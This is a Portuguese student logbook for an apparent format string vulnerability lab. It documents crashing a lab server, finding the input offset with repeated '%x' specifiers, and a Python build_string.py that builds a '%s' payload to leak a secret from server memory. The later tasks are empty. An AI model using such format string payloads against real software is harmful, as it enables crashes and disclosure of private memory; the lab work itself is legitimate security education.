# LOGBOOK 7

## Tarefa 1

Nesta tarefa tinhamos como objetivo causar o crash do servidor.

**Código injetado para o servidor.**<br>
![image 1](docs/images/Captura_de_ecr%C3%A3_2023-11-17_180216.png)

**Servidor sem crash, ou seja, aparece:**<br>
```(^_^)(^_^)  Returned properly (^_^)(^_^)```

![image 2](docs/images/Captura_de_ecr%C3%A3_2023-11-17_175035.png)

**Código injetado que causa crash do servidor.**<br>
![image 3](docs/images/Captura_de_ecr%C3%A3_2023-11-17_180241.png)

**Servidor com crash, ou seja, não aparece:**<br>
```(^_^)(^_^)  Returned properly (^_^)(^_^)```<br>

![image 4](docs/images/Captura_de_ecr%C3%A3_2023-11-17_180302.png)

## Tarefa 2.A

Nesta tarefa tinhamos de descubrir quantos %x eram necessários para fazer print dos 4 primeiros bytes do input. Escolhemos `@@@@`, pois podemos identificá-lo facilmente por `0x40404040`.

**Código que injetamos, com 64 vezes `%x`.**<br>
![image 5](docs/images/Captura_de_ecr%C3%A3_2023-11-17_184517.png)

**Servidor com `0x40404040`.**<br>
![image 6](docs/images/Captura_de_ecr%C3%A3_2023-11-17_184539.png)

## Tarefa 2.B

Nesta tarefa tinhamos de usar o conhecimento obtido na tarefa 2.A para obter uma mensagem secreta do servidor.
Para isso, modificámos o *build_string.py* que nos foi disponibilizada.

***build_string.py* usada.**<br>
```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*63 + "%s"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

```
**Servidor com a mensagem secreta.**<br>
![image 7](docs/images/Captura_de_ecr%C3%A3_2023-11-17_191650.png)

## Tarefa 3.A

## Tarefa 3.B

